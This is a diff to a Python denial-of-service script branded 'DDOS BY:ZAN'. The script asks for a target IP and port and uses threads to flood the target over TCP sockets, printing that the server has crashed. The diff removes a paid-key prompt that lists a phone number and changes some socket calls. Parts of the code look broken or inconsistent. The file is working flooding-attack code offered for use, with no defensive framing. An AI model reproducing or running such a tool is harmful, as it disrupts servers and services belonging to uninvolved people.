@@ -813,18 +813,7 @@ print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |   TCP    |      UDP:17091    |
               |   UDP    |
               """)
-def kok():
- print("Buy Key? chat:085871151230")
- mopon = str(input("code >= "))
- if mopon == "lifetime20":
-    unlock = 2
- else:
-    unlock = 1
- if unlock == 1:
-    print("ORDER DEK")
- if unlock == 2:
-    print("VĪP DÉTÉÇT")
-kok()
+
 ip = str(input("IP ATTACK>="))
 ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
@@ -892,12 +881,10 @@ def attck():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_lol))
-            s.sendto((main_lol))
-            s.send((data3))
+            s.send((main_lol))
             for i in range(pack):
                 s.send(str.encode(main_lol))
-                s.sendto((main_lol))
-                s.sendto((data3))
+                s.send((main_lol))
             xx += random.randint(0, int(pack))
             print("SÉRVÉR {1} CRÂSH BY ZÁN")
         except:
@@ -905,8 +892,4 @@ def attck():
             print('[+] server error')
 for bj in range(th):
    thred = threading.Thread(target=start)
-   thred2 = threading.Thread(target=attck)
    thred.start()
-   thred2.start()
-for y in range(10000):
-    thred.join()
